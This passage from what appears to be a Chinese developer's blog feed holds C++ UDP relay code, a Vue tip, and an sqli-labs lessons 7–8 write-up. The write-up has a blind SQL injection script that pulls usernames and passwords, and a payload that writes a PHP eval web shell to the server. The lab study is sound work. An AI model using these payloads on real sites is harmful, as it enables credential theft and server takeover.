inet_pton(AF_INET6, <span class="string">&quot;::0&quot;</span>, &amp;waiAddr.sin6_addr);<span class="comment">//ip换成cli的ip?????????????有待测试 用::0应该可以</span></span><br><span class="line">    &#125;</span><br><span class="line">    INITSOCKETwai(&amp;waiSock,&amp;waiAddr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/////------------------------------------test-------------------------------------</span></span><br><span class="line">    <span class="comment">///禁用 10054 报错</span></span><br><span class="line"></span><br><span class="line">     BOOL bEnalbeConnRestError = FALSE;</span><br><span class="line">     DWORD dwBytesReturned = <span class="number">0</span>;</span><br><span class="line">     WSAIoctl(dstSock, SIO_UDP_CONNRESET, &amp;bEnalbeConnRestError, <span class="keyword">sizeof</span>(bEnalbeConnRestError), \</span><br><span class="line">              <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwBytesReturned, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    int addrlen=sizeof(struct sockaddr_in6);</span></span><br><span class="line"><span class="comment">    int fromlen=sizeof(struct sockaddr_in);</span></span><br><span class="line"><span class="comment">    int buflen,temp;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    while(1)&#123;</span></span><br><span class="line"><span class="comment">        temp = recvfrom(dstSock,data,bufsize,0,(SOCKADDR*)&amp;getjhaddr,&amp;fromlen);</span></span><br><span class="line"><span class="comment">        if(temp==SOCKET_ERROR) &#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;3333ERRORNUM:%d&quot;,WSAGetLastError());</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;dst--&gt;pot:::%s\n&quot;,data);</span></span><br><span class="line"><span class="comment">        //printf(&quot;vji:%d,IP:%d,port:%d\n&quot;,getwaiaddr-&gt;sin6_family,getwaiaddr-&gt;sin6_addr,getwaiaddr-&gt;sin6_port);</span></span><br><span class="line"><span class="comment">        temp=sendto(waiSock,data,strlen(data),0,(SOCKADDR*)&amp;getwaiaddr,addrlen);//有问题</span></span><br><span class="line"><span class="comment">        if(temp==SOCKET_ERROR) &#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;send3333ERRORNUM:%d\n&quot;,WSAGetLastError());</span></span><br><span class="line"><span class="comment">        &#125;memset(data,0,temp);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    while(1) &#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;1\n&quot;);</span></span><br><span class="line"><span class="comment">        int temp = recvfrom(waiSock,data,sizeof(data),0,(SOCKADDR*)&amp;getwaiaddr,&amp;fromlen);</span></span><br><span class="line"><span class="comment">        if(temp==SOCKET_ERROR) &#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;ERRORNUM:%d&quot;,WSAGetLastError());</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        if(buflen)&#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;从对外端口转发回%s\n&quot;,data);</span></span><br><span class="line"><span class="comment">            temp=sendto(waiSock,data,strlen(data),0,(SOCKADDR*)&amp;getwaiaddr,sizeof(getwaiaddr));</span></span><br><span class="line"><span class="comment">            if(temp==-1) &#123;</span></span><br><span class="line"><span class="comment">                printf(&quot;222ERRORNUM:%d&quot;,WSAGetLastError());</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="comment">/////--------------------------------------------------test-----------------------</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/////////////////////////线程传参</span></span><br><span class="line">        fun_para serif_ST;</span><br><span class="line">        serif_ST.dstSockjb=&amp;dstSock;</span><br><span class="line">        serif_ST.waiSockjb=&amp;waiSock;</span><br><span class="line">        serif_ST.dstAddrjb=&amp;dstAddr;</span><br><span class="line">        serif_ST.waiAddrjb=&amp;waiAddr;</span><br><span class="line">        serif_ST.getjhaddr=&amp;getjhaddr;</span><br><span class="line">        serif_ST.getwaiaddr=&amp;getwaiaddr;</span><br><span class="line">        <span class="comment">////////////////////////////</span></span><br><span class="line">        <span class="built_in">std</span>::thread <span class="title function_">proc1</span><span class="params">(p2jf, &amp;serif_ST)</span>;</span><br><span class="line">        <span class="built_in">std</span>::thread <span class="title function_">proc2</span><span class="params">(j2pf, &amp;serif_ST)</span>;</span><br><span class="line">        proc1.join();</span><br><span class="line">        proc2.join();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">j2pf</span><span class="params">(fun_para * info)</span>&#123;</span><br><span class="line"></span><br><span class="line">    SOCKET *dstSock,*waiSock;</span><br><span class="line">    SOCKADDR_IN *dstAddr&#123;&#125;,*getjhaddr&#123;&#125;;</span><br><span class="line">    SOCKADDR_IN6 *waiAddr&#123;&#125;,*getwaiaddr&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    dstSock=info-&gt;dstSockjb;</span><br><span class="line">    waiSock=info-&gt;waiSockjb;</span><br><span class="line">    dstAddr=info-&gt;dstAddrjb;</span><br><span class="line">    waiAddr=info-&gt;waiAddrjb;</span><br><span class="line">    getjhaddr=info-&gt;getjhaddr;</span><br><span class="line">    getwaiaddr=info-&gt;getwaiaddr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;j2pf线程已启用\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="type">int</span> fromlen=<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">    <span class="type">int</span> addrlen=<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in6);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        temp = recvfrom(*dstSock,dataj,bufsize,<span class="number">0</span>,(SOCKADDR*)getjhaddr,&amp;fromlen);</span><br><span class="line">        <span class="keyword">if</span>(temp==SOCKET_ERROR) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;3333ERRORNUM:%d\n&quot;</span>,WSAGetLastError());</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//printf(&quot;dst--&gt;pot:::%s\n&quot;,dataj);</span></span><br><span class="line">        <span class="comment">//printf(&quot;vji:%d,IP:%d,port:%d\n&quot;,getwaiaddr-&gt;sin6_family,getwaiaddr-&gt;sin6_addr,getwaiaddr-&gt;sin6_port);</span></span><br><span class="line">        temp=sendto(*waiSock,dataj,temp,<span class="number">0</span>,(SOCKADDR*)getwaiaddr,addrlen);<span class="comment">//有问题</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//if(temp==SOCKET_ERROR) printf(&quot;send3333ERRORNUM:%d\n&quot;,WSAGetLastError());</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">p2jf</span><span class="params">(fun_para * info)</span>&#123;</span><br><span class="line"></span><br><span class="line">    SOCKET *dstSock,*waiSock;</span><br><span class="line">    SOCKADDR_IN *dstAddr&#123;&#125;,*getjhaddr&#123;&#125;;</span><br><span class="line">    SOCKADDR_IN6 *waiAddr&#123;&#125;,*getwaiaddr&#123;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    dstSock=info-&gt;dstSockjb;</span><br><span class="line">    waiSock=info-&gt;waiSockjb;</span><br><span class="line">    dstAddr=info-&gt;dstAddrjb;</span><br><span class="line">    waiAddr=info-&gt;waiAddrjb;</span><br><span class="line">    getjhaddr=info-&gt;getjhaddr;</span><br><span class="line">    getwaiaddr=info-&gt;getwaiaddr;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="type">int</span> fromlen=<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in6);</span><br><span class="line">    <span class="type">int</span> addrlen=<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p2jf线程已启用\n&quot;</span>);</span><br><span class="line">    serport=htons(serport);</span><br><span class="line">    limport=htons(limport);</span><br><span class="line">    sockaddr_in6 yanzheng;</span><br><span class="line">    <span class="comment">//inet_pton(AF_INET6,ip,&amp;yanzheng.sin6_addr);</span></span><br><span class="line"><span class="comment">//////client</span></span><br><span class="line">    <span class="comment">//long * ser=(long*)&amp;getwaiaddr-&gt;sin6_addr.u;</span></span><br><span class="line">    <span class="comment">//long * gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(soc) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            temp = recvfrom(*waiSock,dataw,bufsize,<span class="number">0</span>,(SOCKADDR*)getwaiaddr,&amp;fromlen);</span><br><span class="line">            <span class="keyword">if</span>(getwaiaddr-&gt;sin6_port!=limport) &#123;</span><br><span class="line">                <span class="type">char</span> temip[<span class="number">64</span>];</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;非法连接\n&quot;</span>;</span><br><span class="line">                inet_ntop(AF_INET6,&amp;(getwaiaddr-&gt;sin6_addr),temip,<span class="keyword">sizeof</span>(temip));</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ip==&quot;</span>&lt;&lt;temip&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="type">int</span> tpt=ntohs(getwaiaddr-&gt;sin6_port);</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;port==&quot;</span>&lt;&lt;tpt&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                temip[<span class="number">64</span>]=getchar();temip[<span class="number">64</span>]=getchar();temip[<span class="number">64</span>]=getchar();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//if(!soc &amp;&amp;(getwaiaddr-&gt;sin6_port!=serport||getwaiaddr-&gt;sin6_addr!=yanzhengip))</span></span><br><span class="line">            <span class="keyword">if</span>(temp==SOCKET_ERROR) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;2222ERRORNUM:%d&quot;</span>,WSAGetLastError());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//printf(&quot;端口%d\n&quot;,getwaiaddr-&gt;sin6_port);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//(&quot;pot--&gt;dst:::%s\n&quot;,dataw);</span></span><br><span class="line">            temp=sendto(*dstSock,dataw,temp,<span class="number">0</span>,(SOCKADDR*)getjhaddr,addrlen);</span><br><span class="line">            <span class="comment">//if(temp==SOCKET_ERROR) printf(&quot;send2222ERRORNUM:%d&quot;,WSAGetLastError());</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            temp = recvfrom(*waiSock,dataw,bufsize,<span class="number">0</span>,(SOCKADDR*)&amp;yanzheng,&amp;fromlen);</span><br><span class="line">            <span class="keyword">if</span>(temp==SOCKET_ERROR) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;2222ERRORNUM:%d&quot;</span>,WSAGetLastError());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(yanzheng.sin6_port!=serport) &#123;</span><br><span class="line">                <span class="type">char</span> temip[<span class="number">64</span>];</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;非法连接\n&quot;</span>;</span><br><span class="line">                inet_ntop(AF_INET6,&amp;(yanzheng.sin6_addr),temip,<span class="keyword">sizeof</span>(temip));</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ip==&quot;</span>&lt;&lt;temip&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="type">int</span> tpt=ntohs(yanzheng.sin6_port);</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;port==&quot;</span>&lt;&lt;tpt&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                temip[<span class="number">64</span>]=getchar();temip[<span class="number">64</span>]=getchar();temip[<span class="number">64</span>]=getchar();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//if(!soc &amp;&amp;(getwaiaddr-&gt;sin6_port!=serport||getwaiaddr-&gt;sin6_addr!=yanzhengip))</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//printf(&quot;端口%d\n&quot;,getwaiaddr-&gt;sin6_port);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//(&quot;pot--&gt;dst:::%s\n&quot;,dataw);</span></span><br><span class="line">            temp=sendto(*dstSock,dataw,temp,<span class="number">0</span>,(SOCKADDR*)getjhaddr,addrlen);</span><br><span class="line">            <span class="comment">//if(temp==SOCKET_ERROR) printf(&quot;send2222ERRORNUM:%d&quot;,WSAGetLastError());</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">INITSOCKETwai</span><span class="params">(SOCKET *waiSock, SOCKADDR_IN6 *waiAddr)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((*waiSock=socket(AF_INET6,SOCK_DGRAM,IPPROTO_UDP))==INVALID_SOCKET)&#123;<span class="comment">//socket(PF_INET,SOCK_DGRAM,0)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket\n======waisock======&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(bind(*waiSock, (<span class="keyword">struct</span> sockaddr*)waiAddr, <span class="keyword">sizeof</span>(*waiAddr))==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket\n=====waibind=======&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">INITSOCKET</span><span class="params">(SOCKET *dstSock, SOCKADDR_IN *dstAddr)</span>&#123;<span class="comment">//AF_INET6=23</span></span><br><span class="line">    <span class="keyword">if</span>((*dstSock=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP))==INVALID_SOCKET)&#123;<span class="comment">//socket(PF_INET,SOCK_DGRAM,0)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket\n======dstsock======&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">if</span>(bind(*dstSock,(SOCKADDR*)dstAddr,<span class="keyword">sizeof</span>(*dstAddr))==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket1========dstbind=========&quot;</span>);</span><br><span class="line">        closesocket(*dstSock);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="cmakelist-txt"><a href="#cmakelist-txt" class="headerlink" title="cmakelist.txt"></a>cmakelist.txt</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.5</span>.<span class="number">0</span>)</span><br><span class="line"><span class="keyword">project</span>(asocket)</span><br><span class="line"></span><br><span class="line"><span class="comment">#include(CTest)</span></span><br><span class="line"><span class="comment">#enable_testing()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#file(GLOB SOURCES *.c)</span></span><br><span class="line"><span class="comment">#file(GLOB SOURCES *.cpp)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#link_libraries(完整路径)</span></span><br><span class="line"><span class="comment">#include_directories(&quot;G:/mingw64seh/x86_64-w64-mingw32/include/&quot;)</span></span><br><span class="line"><span class="comment">#target_link_libraries(demo &quot;G:/mingw64seh/x86_64-w64-mingw32/lib/libws2_32.a&quot;)</span></span><br><span class="line"><span class="comment">#target_link_libraries(demo &quot;G:/mingw64seh/x86_64-w64-mingw32/lib/libwsock32.a&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#target_link_libraries($&#123;PROJECT_NAME&#125; libws2_32.a)</span></span><br><span class="line"><span class="comment">#target_link_libraries($&#123;PROJECT_NAME&#125; libwsock32.a)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">17</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="string">&quot;-static-libgcc -static-libstdc++&quot;</span>)</span><br><span class="line"><span class="keyword">link_libraries</span>(ws2_32)</span><br><span class="line"><span class="keyword">add_executable</span>(asocket main.cpp)</span><br><span class="line"><span class="comment">#set(CPACK_PROJECT_NAME $&#123;PROJECT_NAME&#125;)</span></span><br><span class="line"><span class="comment">#set(CPACK_PROJECT_VERSION $&#123;PROJECT_VERSION&#125;)</span></span><br><span class="line"><span class="comment">#include(CPack)</span></span><br><span class="line"><span class="comment">#add_executable(asocket main.cpp)</span></span><br></pre></td></tr></table></figure></details>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> 木大 </tag>
            
            <tag> vscode </tag>
            
            <tag> cmake </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>v-for中控制特定元素</title>
      <link href="/2024/11/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/vue/v-for%E4%B8%AD%E6%8E%A7%E5%88%B6%E7%89%B9%E5%AE%9A%E5%85%83%E7%B4%A0/"/>
      <url>/2024/11/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/vue/v-for%E4%B8%AD%E6%8E%A7%E5%88%B6%E7%89%B9%E5%AE%9A%E5%85%83%E7%B4%A0/</url>
      
        <content type="html"><![CDATA[<p>可以用:ref给元素绑定唯一值，再用const domElement &#x3D; this.$refs[refName];获取元素<br> <span id="more"></span></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;file_list_item&quot;</span> <span class="attr">v-for</span>=<span class="string">&quot;(file,obj_key) in file_list&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;obj_key&quot;</span> <span class="attr">:ref</span>=<span class="string">&quot;`idx-$&#123;obj_key&#125;`&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;flex_row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;removeCom(obj_key)&quot;</span> <span class="attr">id</span>=<span class="string">&quot;removecom&quot;</span>&gt;</span>X<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;filename&quot;</span>&gt;</span>&#123;&#123; file.name &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">auplfile</span> <span class="attr">:file</span>=<span class="string">&quot;file&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;obj_key&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="v-for-file-obj-key-in-file-list-中的file-list最好是对象"><a href="#v-for-file-obj-key-in-file-list-中的file-list最好是对象" class="headerlink" title="v-for&#x3D;&quot;(file,obj_key) in file_list&quot; 中的file_list最好是对象"></a>v-for&#x3D;&quot;(file,obj_key) in file_list&quot; 中的file_list最好是对象</h4><p>因为<li v-for="(value, key, index) in myObject">再遍历对象时，()中第二个变量是对象的key<br>如果file_list是数组，再删除数组中的某个值后，后面v-for生成的元素会依次顶替上来，造成refName不唯一<br>数组 0 1 2 3 4 删除3 &#x3D;&gt; 0 1 2 3<br>对象 &#39;0&#39; &#39;1&#39; &#39;2&#39; &#39;3&#39;  删除&#39;1&#39; &#x3D;&gt; &#39;0&#39; &#39;2&#39; &#39;3&#39; </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">removeCom</span>(<span class="params">index</span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> e_idx = <span class="variable language_">this</span>.<span class="property">$refs</span>[<span class="string">`idx-<span class="subst">$&#123;index&#125;</span>`</span>];</span><br><span class="line">  e_idx[<span class="number">0</span>].<span class="property">style</span>.<span class="property">height</span>=<span class="string">&#x27;0px&#x27;</span></span><br><span class="line">   <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">file_list</span>[index]</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">file_list</span>)</span><br><span class="line">  &#125;, <span class="number">450</span>); </span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> vue3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab-less-7,8</title>
      <link href="/2024/10/30/%E5%AD%A6/sqli-labs/sqli-labs-less_7,8/"/>
      <url>/2024/10/30/%E5%AD%A6/sqli-labs/sqli-labs-less_7,8/</url>
      
        <content type="html"><![CDATA[<h3 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h3> <span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"><span class="comment"># 1&#x27; and 1=1 --+                  #url=&quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot;+&quot;1&#x27; and &#x27;&quot;+c+&quot;&#x27; &gt; substr((select database() ),&quot;+idx+&quot;,1);--+&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst</span>(<span class="params">c,idx=<span class="number">0</span></span>):                                           <span class="comment">#select group_concat(table_name) from information_schema.tables where table_schema=database()</span></span><br><span class="line">    idx=<span class="built_in">str</span>(idx)                                                      <span class="comment">#select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;                                                                                        </span></span><br><span class="line">                                                                    </span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot;</span>+<span class="string">&quot;1&#x27; and SUBSTR((select group_concat(username,&#x27;-&#x27;,password) from users),&quot;</span>+idx+<span class="string">&quot;,1)&lt;&#x27;&quot;</span>+c+<span class="string">&quot;&#x27;;--+&quot;</span></span><br><span class="line">    res=requests.get(url) <span class="comment">#注入 c &gt; str切片(idx,1) #结果为真执行if          </span></span><br><span class="line"></span><br><span class="line">    t=fnmatch.fnmatch(res.text,<span class="string">&#x27;*You are in*&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(t):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">l,r,cmp,idx</span>): </span><br><span class="line">    p=r//<span class="number">2</span> - l</span><br><span class="line">    <span class="keyword">while</span>(r-l&gt;<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(cmp(<span class="built_in">chr</span>(p) , idx)):<span class="comment">#大于</span></span><br><span class="line">            r=p</span><br><span class="line">            p=p-(p-l)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=p</span><br><span class="line">            p=p+(r-p)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(l)</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    a+=find(<span class="number">0</span>,<span class="number">127</span>,cmptst,i)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>@@datadir获取数据库存储数据路径 ，@@basedir是MYSQL获取安装路径<br>id&#x3D;1&#39;)) and (select count(*) from mysql.user)&gt;0 --+ 如果返回正常则有读取权限<br>参考: <a href="https://blog.csdn.net/m0_46315342/article/details/106557552">参考</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,&quot;&lt;?php @eval($_POST[&#x27;</span><span class="number">123</span><span class="string">&#x27;]);?&gt;&quot;,3 into outfile &quot;/var/www/html/sqli-labs-php7/Less-3/1.php&quot; -- +</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sqli </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>py爆破zip脚本</title>
      <link href="/2024/10/28/%E5%B7%A5%E5%85%B7/py%E7%88%86%E7%A0%B4zip%E8%84%9A%E6%9C%AC/"/>
      <url>/2024/10/28/%E5%B7%A5%E5%85%B7/py%E7%88%86%E7%A0%B4zip%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>于11-7优化<br> <span id="more"></span></p><details><summary><font color='greenyellow'>lin(展开)</font></summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 